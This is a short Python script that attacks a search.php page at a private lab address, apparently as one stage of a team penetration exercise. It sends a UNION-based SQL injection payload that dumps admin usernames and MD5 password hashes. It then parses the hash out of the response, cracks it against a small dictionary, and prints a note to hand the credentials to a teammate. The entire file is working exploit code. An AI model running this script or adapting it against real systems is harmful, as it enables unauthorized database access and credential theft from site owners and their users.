import requests
import hashlib

url = "http://10.20.0.13/search.php"

# Exploit UNION SQLi to dump username and password_hash from the users table
print("[*] Sending UNION-based SQLi payload...")
payload = "' UNION SELECT username, password_hash FROM users WHERE role='admin' -- -"
r = requests.get(url, params={"q": payload})

# Extract the MD5 hash from the web response
hash_to_crack = ""
for line in r.text.split('<br>'):
    if "admin" in line:
        hash_to_crack = line.split("|")[1].strip()
        break

if not hash_to_crack:
    print("[-] Failed to retrieve admin hash.")
    exit()

print(f"[*] Retrieved Admin MD5 Hash: {hash_to_crack}")
print("[*] Cracking hash against rockyou.txt (subset)...")

# Crack the MD5 hash using a local dictionary
wordlist = ['password', '123456', 'qwerty', 'admin123']
for word in wordlist:
    if hashlib.md5(word.encode()).hexdigest() == hash_to_crack:
        print(f"[+] SUCCESS! Admin password is: {word}")
        print("[!] HANDOFF REQUIRED: Pass these credentials to Member 3 for Stage 4/5.")
        exit()

print("[-] Hash cracking failed.")
